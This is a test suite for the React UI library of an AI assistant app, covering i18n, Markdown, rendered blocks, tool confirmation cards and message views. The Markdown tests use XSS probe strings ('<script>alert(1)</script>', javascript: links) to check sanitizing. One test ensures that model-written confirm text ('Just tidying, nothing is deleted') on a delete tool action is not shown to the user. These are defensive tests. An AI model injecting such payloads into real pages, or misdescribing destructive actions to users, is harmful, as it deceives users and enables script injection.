/**
 * @neo/ui test suite (jsdom + Testing Library).
 */
import { afterEach, beforeAll, describe, expect, it, vi } from 'vitest';
import { act, cleanup, fireEvent, render, screen, waitFor } from '@testing-library/react';
import { createRef, type ReactElement } from 'react';
import type { Message, MemoryNode, ToolConfirmation, UIAction, UIBlock, UiActionConfirmation } from '@neo/protocol';
import { FORM_SUBMIT_ACTION_ID } from '@neo/protocol';
import { I18nProvider, buildMessages, createTranslator, dictionaries, useT } from './i18n.js';
import { BlockList, BlockRenderer, formatCell, validateFormField, type OnUIAction } from './blocks.js';
import { ConfirmationCard, MessageView, humanizeToolName, uiActionConfirmOptions, useUiActionConfirm } from './message.js';
import { Composer, type ComposerHandle } from './composer.js';
import { MemoryGraphView } from './memory-graph.js';
import { MemoryNodeCard } from './memory-card.js';
import { Markdown } from './markdown.js';
import { LinkProvider } from './links.js';
import { ConfirmProvider } from './confirm.js';
import { niceTicks, prepareSeries } from './chart.js';
import { Icon, iconPaths } from './icons.js';
import { SegmentedControl, Tabs } from './primitives.js';
import { RemoteImageProvider, classifyImageUrl, isRemoteImageHostAllowed, resetRemoteImageHosts } from './remote-image.js';

afterEach(cleanup);

beforeAll(() => {
  globalThis.ResizeObserver ??= class {
    observe() {}
    unobserve() {}
    disconnect() {}
  } as unknown as typeof ResizeObserver;
  // jsdom has no canvas: make getContext return null quietly so the graph uses its list fallback.
  HTMLCanvasElement.prototype.getContext = (() => null) as unknown as HTMLCanvasElement['getContext'];
});

function wrap(ui: ReactElement, locale = 'en') {
  return render(<I18nProvider locale={locale}>{ui}</I18nProvider>);
}

function msg(partial: Partial<Message> & Pick<Message, 'role' | 'parts'>): Message {
  return { id: 'msg_1', conversationId: 'conv_1', createdAt: 1, status: 'complete', ...partial };
}

// ─────────────────────────────────────────────────────────────────────────────
// i18n
// ─────────────────────────────────────────────────────────────────────────────

describe('i18n', () => {
  it('ships en and zh-CN with the same keys', () => {
    const missing = Object.keys(dictionaries.en).filter((k) => !(k in dictionaries['zh-CN']) && !k.endsWith('_one'));
    expect(missing).toEqual([]);
  });

  it('interpolates variables', () => {
    const t = createTranslator('en', buildMessages('en'));
    expect(t('block.tasks_progress', { done: 2, total: 5 })).toBe('2 of 5 done');
  });

  it('picks plural forms with Intl.PluralRules', () => {
    const t = createTranslator('en', buildMessages('en'));
    expect(t('chat.recalled', { n: 1 })).toBe('Recalled 1 memory');
    expect(t('chat.recalled', { n: 3 })).toBe('Recalled 3 memories');
    const zh = createTranslator('zh-CN', buildMessages('zh-CN'));
    expect(zh('chat.recalled', { n: 1 })).toBe('想起了 1 条记忆');
  });

  it('merges app messages over the built-ins (English first, then the locale)', () => {
    const merged = buildMessages('zh-CN', { 'zh-CN': { 'app.hello': '你好' }, en: { 'app.hello': 'Hello', 'app.only_en': 'Only' } });
    expect(merged['app.hello']).toBe('你好');
    expect(merged['app.only_en']).toBe('Only');
    expect(merged['common.close']).toBe('关闭');
  });

  it('returns the key for unknown strings', () => {
    function T() {
      const t = useT();
      return <span>{t('no.such.key')}</span>;
    }
    const { container } = wrap(<T />);
    expect(container.textContent).toBe('no.such.key');
  });

  it('renders zh-CN through the provider', () => {
    function T() {
      const t = useT();
      return <span data-testid="v">{t('common.close')}</span>;
    }
    wrap(<T />, 'zh-CN');
    expect(screen.getByTestId('v').textContent).toBe('关闭');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Icons
// ─────────────────────────────────────────────────────────────────────────────

describe('Icon', () => {
  it('resolves names and aliases, falls back for unknown names', () => {
    expect(iconPaths('bell')).not.toBeNull();
    expect(iconPaths('gear')).toEqual(iconPaths('settings'));
    expect(iconPaths('definitely-not-an-icon')).toBeNull();
    const { container } = render(<Icon name="definitely-not-an-icon" />);
    expect(container.querySelector('svg')).toBeTruthy();
  });

  it('renders emoji as text', () => {
    const { container } = render(<Icon name="🎉" label="party" />);
    expect(container.textContent).toBe('🎉');
    expect(container.querySelector('[aria-label="party"]')).toBeTruthy();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Markdown
// ─────────────────────────────────────────────────────────────────────────────

describe('Markdown', () => {
  it('renders GFM', () => {
    const { container } = render(<Markdown text={'Hello **world**\n\n| a | b |\n|---|---|\n| 1 | 2 |'} />);
    expect(container.querySelector('strong')?.textContent).toBe('world');
    expect(container.querySelector('table')).toBeTruthy();
  });

  it('drops raw HTML', () => {
    const { container } = render(<Markdown text={'before <script>alert(1)</script><b>bold</b> after'} />);
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('b')).toBeNull();
  });

  it('blocks javascript: links and non-image URLs as images', () => {
    const { container } = render(<Markdown text={'[click](javascript:alert(1)) ![x](javascript:alert(1)) ![y](ftp://example.com/a.png) ![z](data:text/html;base64,abc)'} />);
    expect(container.querySelectorAll('a').length).toBe(0);
    expect(container.querySelectorAll('img').length).toBe(0);
    expect(container.querySelectorAll('[data-remote-image]').length).toBe(0);
  });

  it('renders inline data:image URLs directly and opens web links in a new tab', () => {
    const { container } = render(<Markdown text={'![pic](data:image/png;base64,iVBORw0KGgo=) [site](https://example.com)'} />);
    expect(container.querySelectorAll('img').length).toBe(1);
    const a = container.querySelector('a')!;
    expect(a.getAttribute('target')).toBe('_blank');
    expect(a.getAttribute('rel')).toContain('noopener');
  });

  it('routes neo:// links through the LinkProvider', () => {
    const onLink = vi.fn(() => true);
    const { container } = render(
      <LinkProvider onLink={onLink}>
        <Markdown text={'[open](neo://reminders/rem_1)'} />
      </LinkProvider>,
    );
    fireEvent.click(container.querySelector('a')!);
    expect(onLink).toHaveBeenCalledWith('neo://reminders/rem_1');
  });

  it('renders fenced code with a copy button', () => {
    wrap(<Markdown text={'```ts\nconst a = 1;\n```'} />);
    expect(screen.getByText('ts')).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Copy code' })).toBeTruthy();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Blocks: every type renders
// ─────────────────────────────────────────────────────────────────────────────

const ALL_BLOCKS: [string, UIBlock, string][] = [
  ['text', { type: 'text', text: 'Hello block' }, 'Hello block'],
  ['heading', { type: 'heading', text: 'My Heading', level: 1 }, 'My Heading'],
  ['card', { type: 'card', title: 'Card Title', subtitle: 'Sub', children: [{ type: 'text', text: 'body' }], footer: 'Foot' }, 'Card Title'],
  ['list', { type: 'list', ordered: true, items: [{ id: 'a', title: 'Item A', subtitle: 'first', badge: 'new' }] }, 'Item A'],
  ['table', { type: 'table', columns: [{ key: 'n', label: 'Name' }, { key: 'v', label: 'Value', format: 'number' }], rows: [{ n: 'Alpha', v: 1234.5 }] }, 'Alpha'],
  ['chart', { type: 'chart', kind: 'bar', title: 'Sales', series: [{ name: 'Q', data: [{ x: 'Jan', y: 3 }, { x: 'Feb', y: 5 }] }] }, 'Sales'],
  ['stat', { type: 'stat', label: 'Users', value: 42, delta: 3, deltaLabel: 'this week' }, 'Users'],
  ['progress', { type: 'progress', label: 'Upload', value: 0.6 }, '60%'],
  ['form', { type: 'form', title: 'Profile', fields: [{ name: 'name', label: 'Your name', kind: 'text' }] }, 'Your name'],
  ['buttons', { type: 'buttons', actions: [{ id: 'b', label: 'Yes', kind: 'message', text: 'yes' }] }, 'Yes'],
  ['image', { type: 'image', url: 'https://example.com/a.png', alt: 'A picture', caption: 'Caption' }, 'Caption'],
  ['gallery', { type: 'gallery', images: [{ url: 'https://example.com/a.png', alt: 'one' }] }, ''],
  ['callout', { type: 'callout', tone: 'warning', title: 'Heads up', text: 'Note this' }, 'Note this'],
  ['code', { type: 'code', code: 'console.log("hi")', language: 'js' }, 'console.log'],
  ['quote', { type: 'quote', text: 'To be or not to be', cite: 'Hamlet' }, 'Hamlet'],
  ['divider', { type: 'divider', label: 'Later' }, 'Later'],
  ['grid', { type: 'grid', columns: 3, children: [{ type: 'text', text: 'g1' }, { type: 'text', text: 'g2' }] }, 'g2'],
  ['stack', { type: 'stack', direction: 'horizontal', children: [{ type: 'text', text: 's1' }] }, 's1'],
  ['tabs', { type: 'tabs', tabs: [{ id: 't1', label: 'First', children: [{ type: 'text', text: 'tab body' }] }, { id: 't2', label: 'Second', children: [] }] }, 'tab body'],
  ['accordion', { type: 'accordion', items: [{ id: 'a1', title: 'Section', open: true, children: [{ type: 'text', text: 'inside' }] }] }, 'inside'],
  ['link', { type: 'link', url: 'https://example.com/page', title: 'Open Link', description: 'desc' }, 'example.com'],
  ['timeline', { type: 'timeline', items: [{ time: 'Today', title: 'Kick-off' }] }, 'Kick-off'],
  ['keyvalue', { type: 'keyvalue', items: [{ key: 'City', value: 'Berlin' }, { key: 'Open', value: true }] }, 'Berlin'],
  ['tags', { type: 'tags', items: [{ label: 'urgent', tone: 'danger' }] }, 'urgent'],
  ['countdown', { type: 'countdown', label: 'Launch', until: Date.now() + 3_600_000 }, 'Launch'],
  ['reminder', { type: 'reminder', reminderId: 'rem_1', title: 'Stretch', dueAt: Date.now() + 60_000, status: 'scheduled' }, 'Stretch'],
  ['tasks', { type: 'tasks', title: 'Today', tasks: [{ id: 'task_1', title: 'Buy milk', done: false, priority: 3 }] }, 'Buy milk'],
  ['memory', { type: 'memory', nodes: [{ id: 'mem_1', kind: 'fact', label: 'Likes tea', status: 'active' }] }, 'Likes tea'],
];

describe('BlockRenderer — every block type', () => {
  it.each(ALL_BLOCKS)('%s renders', (_type, block, text) => {
    const { container } = wrap(<BlockRenderer block={block} />);
    expect(container.querySelector('.neo-fallback')).toBeNull();
    if (text) expect(container.textContent).toContain(text);
  });

  it('covers the full catalogue', () => {
    expect(new Set(ALL_BLOCKS.map(([t]) => t)).size).toBe(28);
  });

  it('chart includes a visually hidden data table', () => {
    const { container } = wrap(<BlockRenderer block={ALL_BLOCKS.find(([t]) => t === 'chart')![1]} />);
    const table = container.querySelector('table.neo-sr');
    expect(table?.textContent).toContain('Jan');
    expect(table?.textContent).toContain('5');
  });

  it('grid exposes its column count for the responsive collapse', () => {
    const { container } = wrap(<BlockRenderer block={{ type: 'grid', columns: 3, children: [{ type: 'text', text: 'x' }] }} />);
    expect(container.querySelector('.neo-grid')?.getAttribute('data-cols')).toBe('3');
  });

  it('invalid block shows the fallback with a text rendering', () => {
    const { container } = wrap(<BlockRenderer block={{ type: 'mystery', text: 'x' } as unknown as UIBlock} />);
    expect(container.querySelector('.neo-fallback')).toBeTruthy();
    expect(screen.getByText("Can't display this content")).toBeTruthy();
    expect(container.querySelector('details pre')).toBeTruthy();
  });

  it('a block that fails schema validation falls back instead of throwing', () => {
    const bad = { type: 'table', columns: [], rows: [] } as unknown as UIBlock;
    const { container } = wrap(<BlockRenderer block={bad} />);
    expect(container.querySelector('.neo-fallback')).toBeTruthy();
  });

  it('tables longer than 50 rows paginate', () => {
    const rows = Array.from({ length: 60 }, (_, i) => ({ n: `row ${i}` }));
    const { container } = wrap(<BlockRenderer block={{ type: 'table', columns: [{ key: 'n', label: 'N' }], rows }} />);
    expect(container.querySelectorAll('tbody tr').length).toBe(50);
    fireEvent.click(screen.getByText('Show all 60 rows'));
    expect(container.querySelectorAll('tbody tr').length).toBe(60);
  });

  it('formats table cells', () => {
    expect(formatCell(0.256, 'percent', 'en')).toBe('25.6%');
    expect(formatCell(1234.5, 'number', 'en')).toBe('1,234.5');
    expect(formatCell(null, undefined, 'en')).toBe('—');
    expect(formatCell(true, undefined, 'en')).toBe('✓');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Block actions
// ─────────────────────────────────────────────────────────────────────────────

describe('block actions', () => {
  function capture() {
    const calls: { action: UIAction; uiId?: string; values?: Record<string, unknown> }[] = [];
    const onAction: OnUIAction = (action, ctx) => {
      calls.push({ action, uiId: ctx.uiId, values: ctx.values });
    };
    return { calls, onAction };
  }

  it.each([
    ['message', { id: 'm', label: 'Say hi', kind: 'message', text: 'hi' }],
    ['event', { id: 'e', label: 'Pick', kind: 'event', payload: { x: 1 } }],
    ['tool', { id: 'tl', label: 'Run', kind: 'tool', tool: 'get_time' }],
    ['link', { id: 'l', label: 'Open', kind: 'link', url: 'https://example.com' }],
    ['copy', { id: 'c', label: 'Copy it', kind: 'copy', text: 'abc' }],
  ] as [string, UIAction][])('%s actions reach onAction with the uiId', async (_kind, action) => {
    const { calls, onAction } = capture();
    wrap(<BlockRenderer block={{ type: 'buttons', actions: [action] }} uiId="ui_1" onAction={onAction} />);
    fireEvent.click(screen.getByText(action.label));
    await waitFor(() => expect(calls).toHaveLength(1));
    expect(calls[0]).toMatchObject({ action: { id: action.id, kind: action.kind }, uiId: 'ui_1' });
  });

  it('asks before actions with `confirm` (cancel → nothing sent)', async () => {
    const { calls, onAction } = capture();
    const spy = vi.spyOn(window, 'confirm').mockReturnValueOnce(false).mockReturnValueOnce(true);
    wrap(<BlockRenderer block={{ type: 'buttons', actions: [{ id: 'd', label: 'Delete', kind: 'event', confirm: 'Sure?' }] }} uiId="ui_1" onAction={onAction} />);
    fireEvent.click(screen.getByText('Delete'));
    await waitFor(() => expect(spy).toHaveBeenCalledTimes(1));
    expect(calls).toHaveLength(0);
    fireEvent.click(screen.getByText('Delete'));
    await waitFor(() => expect(calls).toHaveLength(1));
    spy.mockRestore();
  });

  it('uses the in-app confirm dialog inside a ConfirmProvider', async () => {
    const { calls, onAction } = capture();
    wrap(
      <ConfirmProvider>
        <BlockRenderer block={{ type: 'buttons', actions: [{ id: 'd', label: 'Start over', kind: 'message', text: 'Start over', confirm: 'Start the plan again?' }] }} uiId="ui_1" onAction={onAction} />
      </ConfirmProvider>,
    );
    fireEvent.click(screen.getByText('Start over'));
    expect(await screen.findByText('Start the plan again?')).toBeTruthy();
    const dialog = screen.getByRole('dialog');
    fireEvent.click(Array.from(dialog.querySelectorAll('button')).find((b) => b.textContent === 'Start over')!);
    await waitFor(() => expect(calls).toHaveLength(1));
  });

  it('never treats model-written `confirm` text as the confirmation for tool actions', async () => {
    const { calls, onAction } = capture();
    const spy = vi.spyOn(window, 'confirm');
    wrap(
      <ConfirmProvider>
        <BlockRenderer block={{ type: 'buttons', actions: [{ id: 'd', label: 'Tidy up', kind: 'tool', tool: 'delete_note', input: { id: 'n1' }, confirm: 'Just tidying, nothing is deleted' }] }} uiId="ui_1" onAction={onAction} />
      </ConfirmProvider>,
    );
    fireEvent.click(screen.getByText('Tidy up'));
    // Straight to onAction: the server decides whether to confirm, with its own description.
    await waitFor(() => expect(calls).toHaveLength(1));
    expect(screen.queryByText('Just tidying, nothing is deleted')).toBeNull();
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(spy).not.toHaveBeenCalled();
    spy.mockRestore();
  });

  it('form submit sends __submit with the values and validates required fields', async () => {
    const { calls, onAction } = capture();
    const { container } = wrap(
      <BlockRenderer
        block={{ type: 'form', fields: [{ name: 'email', label: 'Email', kind: 'email', required: true }, { name: 'n', label: 'Count', kind: 'number' }], submitLabel: 'Go' }}
        uiId="ui_f"
        onAction={onAction}
      />,
    );
    fireEvent.click(screen.getByText('Go'));
    expect(await screen.findByText('This field is required')).toBeTruthy();
    expect(calls).toHaveLength(0);
    const inputs = container.querySelectorAll('input');
    fireEvent.change(inputs[0]!, { target: { value: 'a@b.co' } });
    fireEvent.change(inputs[1]!, { target: { value: '3' } });
    fireEvent.click(screen.getByText('Go'));
    await waitFor(() => expect(calls).toHaveLength(1));
    expect(calls[0]!.action.id).toBe(FORM_SUBMIT_ACTION_ID);
    expect(calls[0]!.values).toEqual({ email: 'a@b.co', n: 3 });
    expect(await screen.findByText('Sent')).toBeTruthy();
  });

  it('validateFormField checks email, url and ranges', () => {
    const t = createTranslator('en', buildMessages('en'));
    expect(validateFormField({ name: 'e', label: 'E', kind: 'email' }, 'nope', t)).toBe('Enter a valid email address');
    expect(validateFormField({ name: 'u', label: 'U', kind: 'url' }, 'javascript:x', t)).toContain('valid web address');
    expect(validateFormField({ name: 'n', label: 'N', kind: 'number', min: 2 }, 1, t)).toBe('Must be at least 2');
    expect(validateFormField({ name: 'n', label: 'N', kind: 'number' }, '', t)).toBeNull();
  });

  it('task checkbox sends task.toggle:<id> with the new done value', async () => {
    const { calls, onAction } = capture();
    wrap(<BlockRenderer block={{ type: 'tasks', tasks: [{ id: 'task_9', title: 'Water plants', done: false }] }} uiId="ui_t" onAction={onAction} />);
    fireEvent.click(screen.getByLabelText('Water plants'));
    await waitFor(() => expect(calls).toHaveLength(1));
    expect(calls[0]!.action.id).toBe('task.toggle:task_9');
    expect(calls[0]!.values).toEqual({ done: true });
    expect((screen.getByLabelText('Water plants') as HTMLInputElement).checked).toBe(true);
  });

  it('task widget prefers live data', () => {
    wrap(
      <BlockRenderer
        block={{ type: 'tasks', tasks: [{ id: 'task_9', title: 'Old title', done: false }] }}
        live={{ tasks: { task_9: { id: 'task_9', listId: 'list_inbox', title: 'New title', notes: null, done: true, doneAt: 1, dueAt: null, priority: 0, tags: [], order: 0, parentId: null, createdAt: 0, updatedAt: 0 } } }}
      />,
    );
    expect((screen.getByLabelText('New title') as HTMLInputElement).checked).toBe(true);
  });

  it('reminder widget snooze and done use the reserved ids', async () => {
    const { calls, onAction } = capture();
    wrap(<BlockRenderer block={{ type: 'reminder', reminderId: 'rem_1', title: 'Stretch', dueAt: Date.now() + 60_000, status: 'scheduled' }} uiId="ui_r" onAction={onAction} />);
    fireEvent.click(screen.getByText('Snooze 10 min'));
    await waitFor(() => expect(calls).toHaveLength(1));
    fireEvent.click(screen.getByText('Snooze 1 h'));
    await waitFor(() => expect(calls).toHaveLength(2));
    fireEvent.click(screen.getByText('Done'));
    await waitFor(() => expect(calls).toHaveLength(3));
    expect(calls.map((c) => c.action.id)).toEqual(['reminder.snooze:10', 'reminder.snooze:60', 'reminder.complete']);
  });

  it('completed reminders have no controls', () => {
    wrap(<BlockRenderer block={{ type: 'reminder', reminderId: 'rem_1', title: 'Stretch', dueAt: 1, status: 'completed' }} onAction={() => undefined} />);
    expect(screen.queryByText('Snooze 10 min')).toBeNull();
  });

  it('memory widget approve / reject / forget use the reserved ids', async () => {
    const { calls, onAction } = capture();
    // Forget is a tool action: the server confirms it, the widget doesn't ask itself.
    const spy = vi.spyOn(window, 'confirm');
    wrap(
      <BlockRenderer
        block={{
          type: 'memory',
          nodes: [
            { id: 'mem_a', kind: 'fact', label: 'Is vegetarian', status: 'pending' },
            { id: 'mem_b', kind: 'preference', label: 'Likes tea', status: 'pending' },
            { id: 'mem_c', kind: 'entity', label: 'Mia', status: 'active' },
          ],
        }}
        uiId="ui_m"
        onAction={onAction}
      />,
    );
    fireEvent.click(screen.getAllByText('Remember')[0]!);
    await waitFor(() => expect(calls).toHaveLength(1));
    fireEvent.click(screen.getAllByText("Don't remember")[0]!);
    await waitFor(() => expect(calls).toHaveLength(2));
    fireEvent.click(screen.getByText('Forget'));
    await waitFor(() => expect(calls).toHaveLength(3));
    expect(calls.map((c) => c.action.id)).toEqual(['memory.approve:mem_a', 'memory.reject:mem_b', 'memory.forget:mem_c']);
    expect(screen.getByText('Remembered')).toBeTruthy();
    expect(screen.getByText('Forgotten')).toBeTruthy();
    expect(spy).not.toHaveBeenCalled();
    spy.mockRestore();
  });

  it('list items with actions are buttons', async () => {
    const { calls, onAction } = capture();
    wrap(<BlockRenderer block={{ type: 'list', items: [{ id: 'i', title: 'Tap me', action: { id: 'go', label: 'Go', kind: 'message', text: 'go' } }] }} uiId="u" onAction={onAction} />);
    fireEvent.click(screen.getByRole('button', { name: /Tap me/ }));
    await waitFor(() => expect(calls).toHaveLength(1));
  });

  it('BlockList renders several blocks', () => {
    const { container } = wrap(<BlockList blocks={[{ type: 'text', text: 'one' }, { type: 'divider' }, { type: 'text', text: 'two' }]} />);
    expect(container.textContent).toContain('one');
    expect(container.textContent).toContain('two');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Chart helpers
// ─────────────────────────────────────────────────────────────────────────────

describe('chart helpers', () => {
  it('niceTicks covers the domain with round steps', () => {
    const ticks = niceTicks(0, 87);
    expect(ticks[0]).toBe(0);
    expect(ticks[ticks.length - 1]).toBeGreaterThanOrEqual(87);
    expect(ticks).toEqual([0, 25, 50, 75, 100]);
    expect(niceTicks(-15, 40)[0]).toBeLessThanOrEqual(-15);
  });

  it('prepareSeries aligns series on the union of x values', () => {
    const p = prepareSeries({
      type: 'chart',
      kind: 'line',
      series: [
        { name: 'a', data: [{ x: 'Mon', y: 1 }, { x: 'Tue', y: 2 }] },
        { name: 'b', data: [{ x: 'Tue', y: 5 }, { x: 'Wed', y: 7 }] },
      ],
    });
    expect(p.categories).toEqual(['Mon', 'Tue', 'Wed']);
    expect(p.values).toEqual([
      [1, 2, null],
      [null, 5, 7],
    ]);
  });

  it('a single-series pie uses one slice per point', () => {
    const { container } = wrap(<BlockRenderer block={{ type: 'chart', kind: 'donut', series: [{ name: 'Spend', data: [{ x: 'Rent', y: 1200 }, { x: 'Food', y: 400 }] }] }} />);
    expect(container.querySelectorAll('svg path').length).toBe(2);
    expect(container.textContent).toContain('Rent');
    expect(container.textContent).toContain('75%');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// ConfirmationCard
// ─────────────────────────────────────────────────────────────────────────────

const confirmation: ToolConfirmation = {
  id: 'cnf_1',
  conversationId: 'conv_1',
  turnId: 'turn_1',
  messageId: 'msg_a',
  toolCallId: 'tc_1',
  name: 'delete_note',
  title: 'Delete note',
  input: { id: 'note_1' },
  description: "Delete note 'Groceries'",
  risk: 'dangerous',
  requestedAt: Date.now(),
  expiresAt: Date.now() + 120_000,
};

describe('ConfirmationCard', () => {
  it('shows the description and risk', () => {
    wrap(<ConfirmationCard confirmation={confirmation} onDecision={() => undefined} />);
    expect(screen.getByText("Delete note 'Groceries'")).toBeTruthy();
    expect(screen.getByText('Irreversible')).toBeTruthy();
  });

  it.each([
    ['Allow', { approve: true }],
    ['Always allow', { approve: true, always: true }],
    ['Deny', { approve: false }],
  ])('%s → decision', async (label, decision) => {
    const onDecision = vi.fn();
    wrap(<ConfirmationCard confirmation={confirmation} onDecision={onDecision} />);
    fireEvent.click(screen.getByText(label));
    await waitFor(() => expect(onDecision).toHaveBeenCalledWith(decision));
  });

  it('reveals the tool input on demand', () => {
    wrap(<ConfirmationCard confirmation={confirmation} onDecision={() => undefined} />);
    fireEvent.click(screen.getByText('Show details'));
    expect(screen.getByText(/note_1/)).toBeTruthy();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// MessageView
// ─────────────────────────────────────────────────────────────────────────────

describe('MessageView', () => {
  it('user message shows text and hides context parts', () => {
    const { container } = wrap(
      <MessageView message={msg({ role: 'user', parts: [{ type: 'context', text: '<neo_context>secret</neo_context>' }, { type: 'text', text: 'Hello there' }] })} />,
    );
    expect(container.textContent).toContain('Hello there');
    expect(container.textContent).not.toContain('secret');
  });

  it('user message renders attached images and ui_event chips', () => {
    const { container } = wrap(
      <MessageView
        message={msg({
          role: 'user',
          parts: [
            { type: 'image', mediaType: 'image/png', data: 'iVBORw0KGgo=' },
            { type: 'ui_event', messageId: 'm', uiId: 'u', actionId: 'a', label: 'Option B', values: { size: 'L' } },
          ],
        })}
      />,
    );
    expect(container.querySelector('img')?.getAttribute('src')).toBe('data:image/png;base64,iVBORw0KGgo=');
    expect(container.textContent).toContain('Option B');
  });

  it('pairs tool_call and tool_result into one chip with the summary', () => {
    const { container } = wrap(
      <MessageView
        message={msg({
          role: 'assistant',
          parts: [
            { type: 'tool_call', id: 'tc_1', name: 'create_reminder', input: { title: 'Stretch' } },
            { type: 'tool_result', toolCallId: 'tc_1', name: 'create_reminder', output: { ok: true }, summary: 'Reminder set for 5:00 PM' },
            { type: 'text', text: 'All set.' },
          ],
        })}
      />,
    );
    const chips = container.querySelectorAll('.neo-pill[data-status]');
    expect(chips.length).toBe(1);
    expect(chips[0]!.getAttribute('data-status')).toBe('done');
    expect(container.textContent).toContain('Create reminder');
    expect(container.textContent).toContain('Reminder set for 5:00 PM');
  });

  it('marks failed results and unfinished calls', () => {
    const { container, rerender } = wrap(
      <MessageView
        message={msg({
          role: 'assistant',
          status: 'streaming',
          parts: [{ type: 'tool_call', id: 'tc_1', name: 'web_fetch', input: {} }],
        })}
        streaming
      />,
    );
    expect(container.querySelector('.neo-pill[data-status="running"]')).toBeTruthy();
    rerender(
      <I18nProvider locale="en">
        <MessageView message={msg({ role: 'assistant', status: 'cancelled', parts: [{ type: 'tool_call', id: 'tc_1', name: 'web_fetch', input: {} }] })} />
      </I18nProvider>,
    );
    expect(container.textContent).toContain("Didn't finish");
    rerender(
      <I18nProvider locale="en">
        <MessageView
          message={msg({
            role: 'assistant',
            parts: [
              { type: 'tool_call', id: 'tc_1', name: 'web_fetch', input: {} },
              { type: 'tool_result', toolCallId: 'tc_1', name: 'web_fetch', output: 'boom', isError: true },
            ],
          })}
        />
      </I18nProvider>,
    );
    expect(container.querySelector('.neo-pill[data-status="error"]')).toBeTruthy();
  });

  it('hides render_ui chips but renders its ui part', () => {
    const { container } = wrap(
      <MessageView
        message={msg({
          role: 'assistant',
          parts: [
            { type: 'tool_call', id: 'tc_ui', name: 'render_ui', input: {} },
            { type: 'tool_result', toolCallId: 'tc_ui', name: 'render_ui', output: 'shown' },
            { type: 'ui', id: 'ui_1', block: { type: 'callout', tone: 'success', text: 'Saved!' }, toolCallId: 'tc_ui' },
          ],
        })}
      />,
    );
    expect(container.querySelectorAll('.neo-pill[data-status]').length).toBe(0);
    expect(container.textContent).toContain('Saved!');
  });

  it('shows confirmations inline under their tool call and forwards decisions', async () => {
    const onConfirm = vi.fn();
    wrap(
      <MessageView
        message={msg({ id: 'msg_a', role: 'assistant', status: 'streaming', parts: [{ type: 'tool_call', id: 'tc_1', name: 'delete_note', input: { id: 'note_1' } }] })}
        streaming
        confirmations={[confirmation]}
        onConfirm={onConfirm}
      />,
    );
    expect(screen.getByText('Waiting for your OK')).toBeTruthy();
    fireEvent.click(screen.getByText('Allow'));
    await waitFor(() => expect(onConfirm).toHaveBeenCalledWith('cnf_1', { approve: true }, confirmation));
  });

  it('answers by confirmation id even when tool call ids repeat across turns', async () => {
    const onConfirm = vi.fn();
    const older: ToolConfirmation = { ...confirmation, id: 'cnf_old', turnId: 'turn_0', messageId: 'msg_old', description: 'Old request' };
    wrap(
      <MessageView
        message={msg({ id: 'msg_a', role: 'assistant', status: 'streaming', parts: [{ type: 'tool_call', id: 'tc_1', name: 'delete_note', input: { id: 'note_1' } }] })}
        streaming
        confirmations={[confirmation, older]}
        onConfirm={onConfirm}
      />,
    );
    // The card next to this message's call is this message's confirmation.
    expect(screen.getByText("Delete note 'Groceries'")).toBeTruthy();
    expect(screen.queryByText('Old request')).toBeNull();
    fireEvent.click(screen.getByText('Deny'));
    await waitFor(() => expect(onConfirm).toHaveBeenCalledWith('cnf_1', { approve: false }, confirmation));
  });

  it('ui actions carry the message id and ui part id', async () => {
    const onUiAction = vi.fn();
    wrap(
      <MessageView
        message={msg({ id: 'msg_x', role: 'assistant', parts: [{ type: 'ui', id: 'ui_9', block: { type: 'buttons', actions: [{ id: 'yes', label: 'Yes', kind: 'message', text: 'yes' }] } }] })}
        onUiAction={onUiAction}
      />,
    );
    fireEvent.click(screen.getByText('Yes'));
    await waitFor(() => expect(onUiAction).toHaveBeenCalled());
    expect(onUiAction.mock.calls[0]![0]).toMatchObject({ messageId: 'msg_x', uiId: 'ui_9', action: { id: 'yes' } });
  });

  it('streams text with a caret and shows a thinking indicator before the first token', () => {
    const { container, rerender } = wrap(<MessageView message={msg({ role: 'assistant', status: 'streaming', parts: [] })} streaming />);
    expect(screen.getByRole('status', { name: 'Thinking…' })).toBeTruthy();
    rerender(
      <I18nProvider locale="en">
        <MessageView message={msg({ role: 'assistant', status: 'streaming', parts: [{ type: 'text', text: 'Hel' }] })} streaming />
      </I18nProvider>,
    );
    expect(container.querySelector('.neo-caret')).toBeTruthy();
  });

  it('reasoning is a collapsible chip', () => {
    wrap(<MessageView message={msg({ role: 'assistant', parts: [{ type: 'reasoning', text: 'Let me think' }, { type: 'text', text: 'Answer' }] })} />);
    expect(screen.queryByText('Let me think')).toBeNull();
    fireEvent.click(screen.getByText('Thought process'));
    expect(screen.getByText('Let me think')).toBeTruthy();
  });

  it('recalled memories chip lists labels and opens memories', () => {
    const onOpenMemory = vi.fn();
    wrap(
      <MessageView
        message={msg({ role: 'assistant', parts: [{ type: 'text', text: 'Hi' }] })}
        recalled={[{ id: 'mem_1', kind: 'fact', label: 'Likes coffee', score: 0.9, reason: 'matches what you said' }]}
        onOpenMemory={onOpenMemory}
      />,
    );
    fireEvent.click(screen.getByText('Recalled 1 memory'));
    fireEvent.click(screen.getByText('Likes coffee'));
    expect(onOpenMemory).toHaveBeenCalledWith('mem_1');
  });

  it('error and cancelled states offer retry', () => {
    const onRetry = vi.fn();
    const { rerender } = wrap(
      <MessageView message={msg({ role: 'assistant', status: 'error', error: { code: 'provider_error', message: 'Rate limited' }, parts: [] })} onRetry={onRetry} />,
    );
    expect(screen.getByText('Rate limited')).toBeTruthy();
    fireEvent.click(screen.getByText('Retry'));
    expect(onRetry).toHaveBeenCalledTimes(1);
    rerender(
      <I18nProvider locale="en">
        <MessageView message={msg({ role: 'assistant', status: 'cancelled', parts: [{ type: 'text', text: 'Partial' }] })} onRetry={onRetry} />
      </I18nProvider>,
    );
    expect(screen.getByText('Stopped')).toBeTruthy();
  });

  it('renders the animated avatar for the assistant', () => {
    const { container } = wrap(<MessageView message={msg({ role: 'assistant', parts: [{ type: 'text', text: 'Hi' }] })} assistantName="Nova" />);
    expect(container.querySelector('.neo-av')).toBeTruthy();
    expect(screen.getByRole('img', { name: 'Nova' })).toBeTruthy();
  });

  it('humanizes tool names', () => {
    expect(humanizeToolName('create_reminder')).toBe('Create reminder');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Composer
